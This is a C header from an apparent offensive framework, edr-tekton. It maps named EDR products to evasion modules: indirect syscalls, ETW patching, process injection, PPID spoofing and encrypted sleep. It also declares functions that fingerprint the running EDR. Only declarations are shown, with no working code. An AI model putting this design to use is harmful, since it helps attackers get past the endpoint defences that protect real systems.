#ifndef TEKTON_PROFILE_H
#define TEKTON_PROFILE_H

/*
 * edr-tekton :: EDR Profile System
 * Maps EDR vendor configurations to optimal technique module
 * selections for each pipeline stage. Profiles are loaded from
 * YAML files or compiled-in defaults, then fed to the pipeline
 * builder for automatic module composition.
 *
 * The selector engine considers:
 *   - EDR vendor detection capabilities per layer
 *   - Module risk scores vs. stealth requirements
 *   - Module compatibility with detected OS/arch
 *   - Technique conflict resolution (e.g., timer sleep
 *     vs. APC sleep, not both)
 *   - Fallback chains when preferred modules are unavailable
 */

#include "types.h"
#include "builder.h"
#include "config.h"
#include "module.h"
#include "context.h"

/* ── EDR Vendor IDs ──────────────────────────────────── */

typedef enum _TEKTON_EDR_VENDOR {
    TEKTON_EDR_UNKNOWN          = 0,
    TEKTON_EDR_CROWDSTRIKE      = 1,    /* Falcon                   */
    TEKTON_EDR_SENTINELONE      = 2,    /* Singularity              */
    TEKTON_EDR_DEFENDER         = 3,    /* Microsoft Defender       */
    TEKTON_EDR_SOPHOS           = 4,    /* Intercept X              */
    TEKTON_EDR_CARBON_BLACK     = 5,    /* VMware Carbon Black      */
    TEKTON_EDR_ELASTIC          = 6,    /* Elastic Security         */
    TEKTON_EDR_CORTEX           = 7,    /* Palo Alto Cortex XDR     */
    TEKTON_EDR_ESET             = 8,    /* ESET Endpoint            */
    TEKTON_EDR_KASPERSKY        = 9,    /* Kaspersky EDR            */
    TEKTON_EDR_BITDEFENDER      = 10,   /* Bitdefender GravityZone  */
    TEKTON_EDR_GENERIC          = 255,  /* Unknown EDR, max stealth */
    TEKTON_EDR_NONE             = 256,  /* No EDR detected          */
    TEKTON_EDR_MAX              = 257,
} TEKTON_EDR_VENDOR;

/* ── Detection Layer Threat Level ────────────────────── */

/*
 * Per-layer threat assessment for each EDR. Drives module
 * selection: if an EDR is THREAT_HIGH on user-mode hooks,
 * the selector picks indirect syscalls over direct. If
 * THREAT_CRITICAL on ETW, it adds ETW patching.
 */
typedef enum _TEKTON_THREAT_LEVEL {
    TEKTON_THREAT_NONE      = 0,    /* Layer not monitored      */
    TEKTON_THREAT_LOW       = 1,    /* Basic monitoring         */
    TEKTON_THREAT_MEDIUM    = 2,    /* Standard detection       */
    TEKTON_THREAT_HIGH      = 3,    /* Advanced detection       */
    TEKTON_THREAT_CRITICAL  = 4,    /* Aggressive, kernel-level */
} TEKTON_THREAT_LEVEL;

/* ── Stage Module Selection ──────────────────────────── */

#define TEKTON_MAX_STAGE_MODULES    4
#define TEKTON_MAX_FALLBACKS        4

typedef struct _TEKTON_STAGE_SELECTION {
    char    primary[64];                                /* First-choice module name    */
    char    fallbacks[TEKTON_MAX_FALLBACKS][64];        /* Ordered fallback list       */
    DWORD   fallback_count;
    BOOL    required;                                   /* Pipeline fails without this */
    BOOL    skip;                                       /* Explicitly disabled         */
    DWORD   max_risk;                                   /* Reject modules above this   */
} TEKTON_STAGE_SELECTION, *PTEKTON_STAGE_SELECTION;

/* ── EDR Profile ─────────────────────────────────────── */

typedef struct _TEKTON_EDR_PROFILE {
    /* Identity */
    char                name[64];           /* "crowdstrike_falcon"     */
    char                display_name[128];  /* "CrowdStrike Falcon"     */
    char                version[16];        /* Profile version          */
    TEKTON_EDR_VENDOR   vendor;

    /* Per-layer threat assessment (drives auto-selection) */
    TEKTON_THREAT_LEVEL threat[TEKTON_SURFACE_MAX];

    /* Per-stage module selections */
    TEKTON_STAGE_SELECTION stages[TEKTON_STAGE_MAX];

    /* Global constraints */
    DWORD   max_total_risk;         /* Sum of all module risks     */
    BOOL    prefer_stealthy;        /* Prefer TEKTON_MOD_STEALTHY  */
    BOOL    require_x64;
    DWORD   min_os_build;           /* Minimum Windows build       */

    /* Sleep configuration */
    DWORD   sleep_interval_ms;
    BOOL    sleep_encrypt;

    /* Encryption */
    DWORD   encrypt_layer_count;
    char    encrypt_types[TEKTON_MAX_ENCRYPT_LAYERS][32];

    /* Injection target override */
    char    inject_target[256];

    /* PPID spoofing parent */
    char    ppid_parent[128];

    /* Notes (informational, not parsed) */
    char    notes[512];
} TEKTON_EDR_PROFILE, *PTEKTON_EDR_PROFILE;

/* ── Profile Registry ────────────────────────────────── */

#define TEKTON_MAX_PROFILES 32

typedef struct _TEKTON_PROFILE_REGISTRY {
    TEKTON_EDR_PROFILE  profiles[TEKTON_MAX_PROFILES];
    DWORD               count;
} TEKTON_PROFILE_REGISTRY, *PTEKTON_PROFILE_REGISTRY;

/* ── Profile API ─────────────────────────────────────── */

/* Get the global profile registry */
PTEKTON_PROFILE_REGISTRY TektonProfileGetRegistry(void);

/* Load a profile from a YAML file */
TEKTON_STATUS TektonProfileLoad(
    const char*             path,
    PTEKTON_EDR_PROFILE     out_profile
);

/* Load a profile from a YAML string */
TEKTON_STATUS TektonProfileParse(
    const char*             yaml_str,
    SIZE_T                  yaml_len,
    PTEKTON_EDR_PROFILE     out_profile
);

/* Register a profile in the global registry */
TEKTON_STATUS TektonProfileRegister(
    PTEKTON_EDR_PROFILE     profile
);

/* Find a registered profile by vendor enum */
PTEKTON_EDR_PROFILE TektonProfileFindByVendor(
    TEKTON_EDR_VENDOR       vendor
);

/* Find a registered profile by name string */
PTEKTON_EDR_PROFILE TektonProfileFindByName(
    const char*             name
);

/* Load all .yaml files from a directory */
TEKTON_STATUS TektonProfileLoadDir(
    const char*             dir_path
);

/* ── Selector API ────────────────────────────────────── */

/*
 * TektonSelectModules: auto-compose a pipeline config from
 * a profile and the current context.
 *
 * For each pipeline stage:
 *   1. Check profile's primary module selection
 *   2. If unavailable/incompatible, try fallbacks in order
 *   3. If all fallbacks fail and stage is required, error
 *   4. Verify module risk score <= stage max_risk
 *   5. Verify total pipeline risk <= profile max_total_risk
 *   6. Write selections into out_config
 */
TEKTON_STATUS TektonSelectModules(
    PTEKTON_EDR_PROFILE     profile,
    PTEKTON_CONTEXT         ctx,
    PTEKTON_CONFIG          out_config
);

/*
 * TektonAutoProfile: detect the running EDR and return
 * the best matching profile from the registry.
 *
 * Detection methods:
 *   - Enumerate running processes for EDR agent names
 *   - Check loaded DLLs for EDR hook libraries
 *   - Check minifilter driver altitudes
 *   - Registry keys for EDR products
 *
 * Falls back to TEKTON_EDR_GENERIC if no match.
 */
PTEKTON_EDR_PROFILE TektonAutoProfile(
    PTEKTON_CONTEXT         ctx
);

/*
 * TektonDetectVendor: identify which EDR is running
 * without loading a full profile. Used by fingerprint stage.
 */
TEKTON_EDR_VENDOR TektonDetectVendor(
    PTEKTON_CONTEXT         ctx
);

/* ── Built-in Profile Loaders ────────────────────────── */

/* Register all compiled-in default profiles */
TEKTON_STATUS TektonProfileLoadDefaults(void);

/* EDR vendor name <-> enum conversion */
const char* TektonVendorToString(TEKTON_EDR_VENDOR vendor);
TEKTON_EDR_VENDOR TektonStringToVendor(const char* name);

#endif /* TEKTON_PROFILE_H */
